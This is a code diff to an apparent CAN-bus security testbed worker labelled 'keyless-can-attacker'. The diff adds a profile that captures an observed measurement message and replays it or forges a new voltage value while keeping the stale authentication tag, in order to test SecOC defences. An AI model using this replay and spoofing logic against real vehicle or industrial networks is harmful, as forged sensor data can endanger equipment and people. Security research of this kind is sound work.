@@ -1,7 +1,8 @@
-"""Keyless CAN-only worker on Pi3, controlled over PC-owned SSH stdin.
+"""Keyless CAN-only worker on Pi3, controlled over its stdin.
 
 No SSH clients, SecOC key input, authentication or reference receiver are used.
 Replay copies a raw/auth pair observed on this bus without verifying its MAC.
+The physical profile copies a complete observed measurement message instead.
 """
 import argparse
 import errno
@@ -15,6 +16,8 @@ import time
 from security.attacks.attack_simulator import build_frame, validate
 from security.experiments.can_capture import CaptureSocket, frame_json
 from security.experiments.trial_observer import healthy
+from security.physical_transport import Assembler
+from security.can_diagnostic import valid_body
 
 # Public ICD IDs, not keys. Isolated classification avoids valid control IDs.
 SESSION_IDS=frozenset((0x100,0x101,0x102,0x103,0x104,0x105,0x200,0x300,0x301,0x302,0x303))
@@ -53,7 +56,35 @@ def replay_pair(records, require_auth):
     raise RuntimeError('no observed replay pair in quiet baseline')
 
 
+def physical_source(records, protected):
+    assembler = Assembler(protected)
+    source = None
+    for frame in records:
+        message = assembler.observe(frame)
+        if source is None and message is not None and message.kind == 9 and valid_body(0x302, 9, message.body):
+            source = list(message.frames)
+    if source is None:
+        raise RuntimeError('no complete physical message observed in quiet baseline')
+    return source
+
+
 def injection_frames(attack, rng, sent, pair, profile):
+    if profile == 'isolated-physical-v1':
+        if attack == 'replay':
+            return pair
+        if attack == 'spoofing':
+            # Alter only the measured voltage in an observed complete message.
+            # The recorded authentication tag remains untouched and unverified.
+            frames = [(cid, bytearray(data)) for cid, data in pair]
+            offset = (22 if frames[0][1][0] == 0xd1 else 0) + 40
+            for index, byte in enumerate((4200000).to_bytes(4, 'big')):
+                position = offset + index
+                frames[position // 4][1][4 + position % 4] = byte
+            if all(bytes(data) == original[1] for (_, data), original in zip(frames, pair)):
+                position = offset + 3
+                frames[position // 4][1][4 + position % 4] ^= 1
+            return [(cid, bytes(data)) for cid, data in frames]
+        profile = 'isolated-session-v1'
     if profile in ('isolated-v1','isolated-session-v1'):
         if attack == 'replay':
             return pair  # Send raw/auth together; never stretch them beyond pending timeout.
@@ -74,12 +105,13 @@ def inject(bus, request, control, deadline, acknowledged):
     error = validate(attack, request['interface'], rate, duration, acknowledged)
     if error:raise ValueError(error)
     profile = request.get('profile', 'mixed-v1')
-    if profile not in ('mixed-v1', 'isolated-v1','isolated-session-v1'):raise ValueError('unknown attack profile')
+    if profile not in ('mixed-v1', 'isolated-v1','isolated-session-v1','isolated-physical-v1'):raise ValueError('unknown attack profile')
     trial = request['trial']
     rng = random.Random(request['seed'])
-    if attack == 'replay':
+    physical = profile == 'isolated-physical-v1'
+    if attack == 'replay' or (physical and attack == 'spoofing'):
         def observed_frames():
-            until = min(deadline, time.monotonic()+1)
+            until = min(deadline, time.monotonic()+(2.5 if physical else 1))
             while time.monotonic()<until:
                 if control.poll() is not None:raise ValueError('unexpected command during replay capture')
                 value=bus.receive(.01)
@@ -87,8 +119,8 @@ def inject(bus, request, control, deadline, acknowledged):
                     frame, own=value
                     if frame.error:raise RuntimeError('CAN error frame')
                     if not own:yield frame
-        pair=replay_pair(observed_frames(), request['secoc'])
-        emit({'result':'REPLAY_SOURCE','trial':trial,'frames':[
+        pair=(physical_source if physical else replay_pair)(observed_frames(), request['secoc'])
+        emit({'result':'REPLAY_SOURCE' if attack == 'replay' else 'SPOOF_SOURCE','trial':trial,'frames':[
             {'can_id':cid,'data':data.hex()} for cid,data in pair], 'authenticated':False})
     else:pair=None
     sent=errors=echoes=0
@@ -128,7 +160,7 @@ def run(channel, duration, run_id, acknowledged, control=None,environment='physi
     try:
         from security.ids.startup_identity import source_digest, file_digest
         import platform,sys
-        emit({'result':'READY','run_id':run_id,'role':'keyless-can-attacker','profiles':['mixed-v1','isolated-v1','isolated-session-v1'],
+        emit({'result':'READY','run_id':run_id,'role':'keyless-can-attacker','profiles':['mixed-v1','isolated-v1','isolated-session-v1','isolated-physical-v1'],
               'execution_identity':{'schema':'python-actor-startup-v1','source_sha256':source_digest(),
                   'interpreter':file_digest(sys.executable),'python':platform.python_version()}})
         while time.monotonic()<deadline:
